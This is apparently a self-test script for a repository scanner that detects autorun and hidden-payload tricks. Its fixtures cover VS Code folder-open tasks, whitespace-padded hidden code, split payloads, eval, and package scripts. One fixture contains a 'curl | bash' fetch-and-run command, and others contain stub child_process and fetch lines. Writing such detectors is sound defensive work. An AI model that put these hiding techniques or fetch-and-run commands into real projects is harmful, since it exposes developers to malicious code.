#!/usr/bin/env node
// Self-test for check-autorun.mjs. Dependency-free (node:assert only).
// Fixtures are generated into throwaway git repos under the OS temp dir, so
// no malicious-looking fixture file is ever committed to this repository
// (which would make the real check, and other scanners, flag the repo itself).
//
// Usage: node scripts/security/check-autorun.selftest.mjs

import assert from "node:assert/strict"
import { Buffer } from "node:buffer"
import { execFileSync } from "node:child_process"
import console from "node:console"
import fs from "node:fs"
import os from "node:os"
import path from "node:path"
import process from "node:process"
import { inspectScript, runChecks } from "./check-autorun.mjs"

const tmpDirs = []

function fixtureRepo(files) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "check-autorun-"))
  tmpDirs.push(dir)
  execFileSync("git", ["init", "-q", dir])
  for (const [rel, content] of Object.entries(files)) {
    const abs = path.join(dir, rel)
    fs.mkdirSync(path.dirname(abs), { recursive: true })
    fs.writeFileSync(abs, content)
  }
  execFileSync("git", ["-C", dir, "-c", "core.autocrlf=false", "add", "-A"])
  return dir
}

function rules(dir) {
  return runChecks(dir).map((f) => `${f.rule}:${f.file}`).sort()
}

const SPACES = " ".repeat(150)
const cleanPkg = JSON.stringify({
  scripts: {
    dev: "tsx watch src/index.ts",
    start: "node --import tsx src/index.ts",
    build: "next build",
    lint: "eslint src tests scripts",
    check: "node scripts/security/check-autorun.mjs",
    env: "NODE_ENV=production node src/index.ts",
  },
}, null, 2)

const cases = [
  {
    name: "clean tree passes",
    files: {
      "package.json": cleanPkg,
      "src/index.ts": "import { x } from './x'\nawait redis.eval('return 1', 0)\nconst retrieval = doRetrieval(x)\n",
      "src/x.ts": "export const x = 1\n// eval( mentioned in a comment is fine\n",
      "scripts/security/check-autorun.mjs": "console.log('ok')\n",
      ".vscode/settings.json": '{ "editor.tabSize": 2, "task.allowAutomaticTasks": "off" }\n',
      ".vscode/tasks.json": '{ "tasks": [{ "label": "build", "runOptions": { "runOn": "default" } }] }\n',
      "public/fonts/inter.woff2": Buffer.from([0x77, 0x4f, 0x46, 0x32, 0, 1, 2]),
      "src/styles.css": "@font-face { src: url('/fonts/inter.woff2') }\n",
      "package-lock.json": `{"a":"${"x".repeat(5000)}"}\n`,
      "vendor/lib.min.js": `${"x".repeat(5000)}\n`,
      "docs/notes.md": `${"word ".repeat(400)}\n`,
    },
    expect: [],
  },
  {
    name: "tasks.json runOn folderOpen",
    files: { ".vscode/tasks.json": '{ "tasks": [{ "label": "x", "runOptions": { "runOn": "folderOpen" } }] }\n' },
    expect: ["vscode-folder-open:.vscode/tasks.json"],
  },
  {
    name: "settings.json allowAutomaticTasks on",
    files: { ".vscode/settings.json": '{ "task.allowAutomaticTasks": "on" }\n' },
    expect: ["vscode-auto-tasks:.vscode/settings.json"],
  },
  {
    name: "code-workspace allowAutomaticTasks true",
    files: { "x.code-workspace": '{ "settings": { "task.allowAutomaticTasks": true } }\n' },
    expect: ["vscode-auto-tasks:x.code-workspace"],
  },
  {
    name: "line over 1,000 chars in config",
    files: { "eslint.config.mjs": `export default [] // ${"a".repeat(1001)}\n` },
    expect: ["long-line:eslint.config.mjs"],
  },
  {
    name: "120+ spaces then code (hidden payload), even in minified/prose files",
    files: {
      "src/app.ts": `export const ok = 1;${SPACES}require('child_process')\n`,
      "vendor/a.min.js": `var a=1;${SPACES}fetch(u)\n`,
      "README.md": `# title${SPACES}x\n`,
    },
    expect: ["hidden-code:README.md", "hidden-code:src/app.ts", "hidden-code:vendor/a.min.js"],
  },
  {
    name: "package script runs an untracked file before the app",
    files: { "package.json": JSON.stringify({ scripts: { dev: "node init && next dev" } }) },
    expect: ["package-script:package.json"],
  },
  {
    name: "nested package script runs an untracked file; inline eval; curl | sh",
    files: {
      "demos/api/package.json": JSON.stringify({ scripts: { start: "tsx src/missing.ts", pre: "node -e \"x\"", get: "curl -s https://x | bash" } }),
    },
    expect: ["package-script:demos/api/package.json", "package-script:demos/api/package.json", "package-script:demos/api/package.json"],
  },
  {
    name: "eval / new Function in source",
    files: {
      "src/a.ts": "const r = eval(payload)\n",
      "lib/b.js": "const f = new Function('return 1')\n",
      "app/c.tsx": "globalThis.eval(code)\n",
    },
    expect: ["dynamic-code:app/c.tsx", "dynamic-code:lib/b.js", "dynamic-code:src/a.ts"],
  },
  {
    name: "unreferenced binaries under public/fonts",
    files: {
      "demos/x/src/public/fonts/fa-solid-900.woff2": Buffer.from([0x77, 0x4f, 0, 0]),
      "demos/x/src/public/fonts/fa-solid-900.svg": "<svg></svg>\n",
    },
    expect: ["unreferenced-font:demos/x/src/public/fonts/fa-solid-900.svg", "unreferenced-font:demos/x/src/public/fonts/fa-solid-900.woff2"],
  },
  {
    name: "tracked but extension-less / non-src entry run before the app",
    files: {
      init: "require('child_process')\n",
      "x.js": "fetch(u)\n",
      "src/index.ts": "export {}\n",
      "package.json": JSON.stringify({ scripts: { dev: "node init && tsx src/index.ts", start: "node ./x.js && node src/index.ts" } }),
    },
    expect: ["package-script:package.json", "package-script:package.json"],
  },
  {
    name: "payload split across several long lines in a config file",
    files: {
      "next.config.mjs": `export default {}\n${Array.from({ length: 3 }, (_, i) => `// ${String(i).repeat(320)}`).join("\n")}\n`,
      "evals/data.json": `${Array.from({ length: 5 }, () => `"${"q".repeat(400)}"`).join("\n")}\n`,
    },
    expect: ["split-payload:next.config.mjs"],
  },
  {
    name: "payload split across lines padded with 40+ spaces in a config file",
    files: {
      "eslint.config.mjs": `export default []${" ".repeat(60)}x()\nconst a = 1${" ".repeat(60)}y()\n`,
      "src/table.ts": `const a = 1${" ".repeat(60)}// aligned\nconst b = 2${" ".repeat(60)}// aligned\n`,
    },
    expect: ["split-payload:eslint.config.mjs"],
  },
]

let failed = 0
try {
  for (const c of cases) {
    try {
      assert.deepEqual(rules(fixtureRepo(c.files)), [...c.expect].sort())
      console.log(`ok   - ${c.name}`)
    } catch (err) {
      failed++
      console.error(`FAIL - ${c.name}\n${err.message}`)
    }
  }

  // Unit checks on the script parser.
  const tracked = new Set(["src/index.ts", "scripts/run.mjs"])
  const unit = [
    ["tsx watch src/index.ts", 0],
    ["node --import tsx src/index.ts", 0],
    ["cross-env A=1 node scripts/run.mjs", 0],
    ["node scripts/run.mjs && tsx watch src/index.ts", 0],
    ["node scripts/run", 1],
    ["vitest run tests/unit", 0],
    ["node init && npm start", 1],
    ["npx tsx scripts/evil.ts", 1],
    ["node --eval=1", 1],
  ]
  for (const [cmd, n] of unit) {
    try {
      assert.equal(inspectScript(cmd, "", tracked).length, n, cmd)
      console.log(`ok   - inspectScript: ${cmd}`)
    } catch (err) {
      failed++
      console.error(`FAIL - inspectScript: ${cmd}\n${err.message}`)
    }
  }
} finally {
  for (const d of tmpDirs) fs.rmSync(d, { recursive: true, force: true })
}

if (failed) {
  console.error(`check-autorun self-test: ${failed} failure(s)`)
  process.exit(1)
}
console.log("check-autorun self-test: all passed")
